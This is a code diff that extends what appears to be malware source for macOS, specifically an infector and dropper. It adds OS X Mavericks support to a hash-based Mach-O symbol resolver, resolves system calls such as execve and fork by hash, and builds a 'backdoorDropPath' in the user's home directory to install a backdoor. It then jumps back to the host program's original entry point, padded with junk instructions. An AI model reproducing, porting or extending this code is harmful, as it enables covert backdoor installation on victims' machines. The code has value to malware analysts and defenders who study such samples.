@@ -520,6 +520,69 @@ findSymbol_snow (byte *imageBase, unsigned int symbolHash)
 	return -1;
 	
 }
+unsigned int
+findSymbol_mavericks(byte *imageBase, unsigned int symbolHash)
+{
+	unsigned int i, offset, found, textVMAddr;
+	struct mach_header *mh_header = NULL;
+	struct load_command *l_command = NULL;
+	struct segment_command *seg_command = NULL;
+	struct symtab_command *sym_command = NULL;
+	struct nlist *sym_nlist = NULL;
+
+	mh_header = (struct mach_header *)imageBase;
+	offset = sizeof(struct mach_header);
+
+	for (i=0, found=0; i<mh_header->ncmds; i++)
+	{
+		l_command = (struct load_command *) (imageBase + offset);
+		if (l_command->cmd == LC_SEGMENT)
+		{
+			if (!found)
+			{
+				seg_command = (struct segment_command *)(imageBase + offset);
+				if (sdbm((unsigned char *)seg_command->segname) == linkeditHash)
+					found = 1;
+
+				if (sdbm((unsigned char *)seg_command->segname) == 0xd5be1a2d)
+					textVMAddr = seg_command->vmaddr;
+
+			}
+		}
+		else if (l_command->cmd == LC_SYMTAB)
+		{
+			if (found)
+			{
+				sym_command = (struct symtab_command *) (imageBase + offset);
+				break;
+			}
+		}
+
+		offset += l_command->cmdsize;
+	}
+
+	if (found == 0 || sym_command == NULL || seg_command == NULL)
+		return -1;
+
+	unsigned int linkeditVmaddr = (seg_command->vmaddr - textVMAddr) + (unsigned int)imageBase;
+	unsigned int stringOffset = sym_command->stroff - seg_command->fileoff + linkeditVmaddr;
+	offset = sym_command->symoff - seg_command->fileoff + linkeditVmaddr;
+
+	for (i=0; i<sym_command->nsyms; i++)
+	{
+		sym_nlist = (struct nlist *)offset;
+		offset += sizeof (struct nlist);
+
+		unsigned char *symbolName = (unsigned char *)(sym_nlist->n_un.n_strx + stringOffset);
+		if (sdbm(symbolName) == symbolHash)
+		{
+			unsigned int sym_offset = sym_nlist->n_value;
+			return (sym_offset - (0x8FE<<20) + (unsigned int)imageBase);
+		}
+	}
+
+	return -1;
+}
 
 unsigned int
 findSymbol_lion(byte *imageBase, unsigned int symbolHash)
@@ -1169,6 +1232,7 @@ void labelTest ()
 {
 }
 
+
 void secondStageDropper (unsigned long args)
 {
 	unsigned int fd;
@@ -1341,8 +1405,10 @@ l_break:
 		{
 			if (file_buffer[i+4] == 0x36)
 				osx_version = 1;
-			else if(file_buffer[i+4] == 0x37)
+			else if(file_buffer[i+4] == 0x37 || file_buffer[i+4] == 0x38)
 				osx_version = 2;
+			else if (file_buffer[i+4] == 0x39)
+				osx_version = 3;
 
 			break;
 		}
@@ -1415,8 +1481,10 @@ l_break:
 
 	if (osx_version == 1)
 		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_snow((byte *)imageBase, dyld_image_countHash));
-	else
+	else if (osx_version == 2)
 		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_lion((byte *)imageBase, dyld_image_countHash));
+	else if (osx_version == 3)
+		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_mavericks((byte *)imageBase, dyld_image_countHash));
 
 	if ((int)_idyld_image_count != -1)
 	{
@@ -1432,12 +1500,19 @@ l_break:
 			_idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))
 				(findSymbol_snow((byte *)imageBase, dyld_get_image_headerHash));
 		}
-		else
+		else if (osx_version == 2)
 		{
 			_idyld_get_image_name = (const char *(__cdecl *)(uint32_t))
 				(findSymbol_lion((byte *)imageBase, dyld_get_image_nameHash));
 			_idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))
 				(findSymbol_lion((byte *)imageBase, dyld_get_image_headerHash));
+		}
+		else if (osx_version == 3)
+		{
+			_idyld_get_image_name = (const char *(__cdecl *)(uint32_t))
+				(findSymbol_mavericks((byte *)imageBase, dyld_get_image_nameHash));
+			_idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))
+				(findSymbol_mavericks((byte *)imageBase, dyld_get_image_headerHash));
 		}
 
 		const struct mach_header *m_header = NULL;
@@ -1491,7 +1566,7 @@ l_break:
 					}
 				}
 			}
-			else
+			else if (osx_version == 2)
 			{
 				// We are on Lion
 				for (z = 0; z < imageCount; z++)
@@ -1539,6 +1614,52 @@ l_break:
 					}
 				}
 			}
+			else
+			{
+				for (z = 0; z < imageCount; z++)
+				{
+					imageName = _idyld_get_image_name(z);
+					m_header  = _idyld_get_image_header(z);
+					unsigned int hash = sdbm((unsigned char *)imageName);
+
+					if (hash == libsystemkHash)
+					{
+						if (libsystemkAddress == NULL)
+							doExit();
+
+						iopen     = (int   (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libsystemkAddress, openHash) + (unsigned int)m_header);
+						ilseek    = (long  (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, lseekHash) + (unsigned int)m_header);
+						iclose    = (int   (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libsystemkAddress, closeHash) + (unsigned int)m_header);
+						ichdir    = (int   (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libsystemkAddress, chdirHash) + (unsigned int)m_header);
+						iwrite    = (int   (__cdecl *)(int, const void *, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, writeHash) + (unsigned int)m_header);
+						ipwrite   = (int   (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, pwriteHash) + (unsigned int)m_header);
+						istat     = (int   (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libsystemkAddress, statHash) + (unsigned int)m_header);
+						immap     = (void *(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, mmapHash) + (unsigned int)m_header);
+						imunmap   = (int   (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, munmapHash) + (unsigned int)m_header);
+						imkdir    = (int   (__cdecl *)(const char *, unsigned int))(findSymbolInFatBinary ((byte *)libsystemkAddress, mkdirHash) + (unsigned int)m_header);
+						iexecve   = (int   (__cdecl *)(const char *, char *, char *))(findSymbolInFatBinary ((byte *)libsystemkAddress, execveHash) + (unsigned int)m_header);
+
+						imemcpy   = (void *(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, memcpyHash) + (unsigned int)m_header);
+						imalloc   = (void *(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libsystemkAddress, mallocHash) + (unsigned int)m_header);
+						ifree     = (void  (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libsystemkAddress, freeHash) + (unsigned int)m_header);
+					}
+					else if (hash == libsystemcHash)
+					{
+						if (libsystemcAddress == NULL)
+							doExit();
+
+						isprintf  = (int   (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libsystemcAddress, sprintfHash) + (unsigned int)m_header);
+						iprintf   = (int   (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libsystemcAddress, printfHash) + (unsigned int)m_header);
+						igetenv   = (char *(__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libsystemcAddress, getenvHash) + (unsigned int)m_header);
+						iexecl    = (int   (__cdecl *)(const char *, const char *,...))(findSymbolInFatBinary ((byte *)libsystemcAddress, execlHash) + (unsigned int)m_header);
+						ifork     = (int   (__cdecl *)(void))(findSymbolInFatBinary ((byte *)libsystemcAddress, forkHash) + (unsigned int)m_header);
+						istrncpy  = (char *(__cdecl *)(char *, const char *, _mSize_t))(findSymbolInFatBinary ((byte *)libsystemcAddress, strncpyHash) + (unsigned int)m_header);
+						isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libsystemcAddress, sleepHash) + (unsigned int)m_header);
+						isigaction = (int (__cdecl *)(int, sigaction *, sigaction *))(findSymbolInFatBinary ((byte *)libsystemcAddress, sigactionHash) + (unsigned int)m_header);
+					}
+
+				}
+			}
 
 			// first restore signal handler
 			new_act.sig_action = 0; // SIG_DFL
@@ -1553,14 +1674,36 @@ l_break:
 			}
 
 			void *envVariableName = (char *)strings[0];
-
 			if (igetenv != 0)
+			{
 				userHome = (char *) igetenv ((const char *)envVariableName);
+			}
 			else
 				errorOnInstall = 1; // FIXME: doExit() or goto EOPCALL
 
+			
 			char *backdoorDropPath = (char *)imalloc(128);
-			isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);
+			char *cin = strings[5];
+			char *qua = strings[4];
+			char *un = strings[1];
+			if (osx_version == 3)
+			{
+				__asm 
+				{
+					push 1 /* fuck SIMD :| */
+					push 1 /* fuck SIMD :| */
+					push 1 /* fuck SIMD :| */
+					push cin
+					push qua
+					push userHome
+					push un
+					push backdoorDropPath
+					call isprintf
+				}
+			}
+			else
+				isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);
+
 			backdoorPath = (char *)imalloc (256);
 			char *backdoorDir = NULL;
 
@@ -1592,7 +1735,19 @@ l_break:
 
 				if (resource->type == RESOURCE_CORE)
 				{
-					istrncpy (backdoorPath, destinationPath, 256);
+					if (osx_version == 3)
+					{
+						__asm
+						{
+							push 1
+							push 256
+							push destinationPath
+							push backdoorPath
+							call istrncpy
+						}
+					}
+					else
+						istrncpy (backdoorPath, destinationPath, 256);
 
 					if ((fd = iopen (destinationPath, O_CREAT | O_EXCL, 0755)) == -1)
 						backdoorIsAlreadyInstalled = 1;
@@ -1655,7 +1810,7 @@ OEP_CALL:
 			// ebp will be disarded by the crt initializer, so we can use it for the jump
 			//
 			__asm__ __volatile__ {
-					mov eax, _eax
+				mov eax, _eax
 	
 				push eax
 				pop eax
@@ -1666,8 +1821,8 @@ OEP_CALL:
 				mov ecx, ecx
 				pop ecx
 
-					mov ecx, _ecx
-					mov edx, _edx
+				mov ecx, _ecx
+				mov edx, _edx
 				
 				push eax
 				pop eax
@@ -1678,10 +1833,10 @@ OEP_CALL:
 				mov ecx, ecx
 				pop ecx
 
-					mov ebx, _ebx
-					mov esi, _esi
-					mov edi, _edi
-					mov esp, _esp
+				mov ebx, _ebx
+				mov esi, _esi
+				mov edi, _edi
+				mov esp, _esp
 					
 				push eax
 				pop eax
@@ -1692,14 +1847,14 @@ OEP_CALL:
 				mov ecx, ecx
 				pop ecx
 
-					mov ebp, originalEP; 
+				mov ebp, originalEP; 
 
 				mov eax, eax
 				add eax, 0
 				mov ebx, ebx
 
-					add ebp, 0x30	// start right where we left, FIXME: what about EP different from crtStart??
-					jmp ebp
+				add ebp, 0x30	// start right where we left, FIXME: what about EP different from crtStart??
+				jmp ebp
 			}
 
 #else
